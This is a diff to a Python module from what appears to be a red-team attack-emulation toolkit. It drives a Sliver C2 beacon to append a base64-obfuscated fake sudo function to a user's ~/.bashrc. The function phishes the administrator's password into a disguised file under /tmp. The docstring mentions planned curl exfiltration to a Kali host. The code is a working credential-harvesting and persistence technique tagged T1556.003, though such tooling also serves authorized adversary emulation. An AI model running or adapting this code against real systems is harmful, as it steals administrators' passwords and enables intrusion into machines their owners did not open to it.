@@ -14,16 +14,21 @@ from advanced_initial_access import sliver_exec
 # kali, and then executes the real sudo.
 # =============================================================================
 
-def run(vinzenz_shell, kali_host):
+def run(vinzenz_beacon, kali_host):
     """
-    Inject a Sudo Phish alias, wait for the admin to use it, and capture the password.
-    
+    Inject a Sudo Phish function into vinzenz's ~/.bashrc, wait for the admin
+    to use sudo in an interactive shell, and capture the password into a local
+    file on the target.
+
     Args:
-        vinzenz_shell (str):   Sliver beacon ID running on vinzenz's workstation.
-        kali_host (str):       Kali IP where the exfiltrated password will be sent.
-        
+        vinzenz_beacon (str): Sliver beacon ID running on vinzenz's workstation.
+        kali_host (str):      Kali IP (reserved for future curl-based exfil --
+                              the current implementation only writes the
+                              captured password to a file on the target).
+
     Returns:
-        dict: A dictionary containing the captured 'vinzenz_password' or None on failure.
+        dict: ``{"vinzenz_password_file": "/tmp/.sys_update.lock"}`` on success,
+              ``{"vinzenz_password_file": None}`` on injection failure.
     """
     log("\n[*] Starting Sudo Phishing on Vinzenz Workstation (T1556.003)...")
 
@@ -52,10 +57,10 @@ def run(vinzenz_shell, kali_host):
     b64_payload = __import__('base64').b64encode(payload.encode()).decode()
     cmd = f"execute -o -- sh -c 'echo \"{b64_payload}\" | base64 -d >> ~/.bashrc'"
     
-    out = sliver_exec(vinzenz_shell, cmd)
+    out = sliver_exec(vinzenz_beacon, cmd)
     if out and "error" in out.lower():
         log(f"[-] Failed to inject alias: {out.strip()}")
-        return {"vinzenz_password": None}
+        return {"vinzenz_password_file": None}
     
     log(f"[*] Sudo alias injected. The password will be saved to /tmp/.sys_update.lock locally.")
     log(f"[*] Waiting 45 seconds to ensure the admin triggers the alias...")
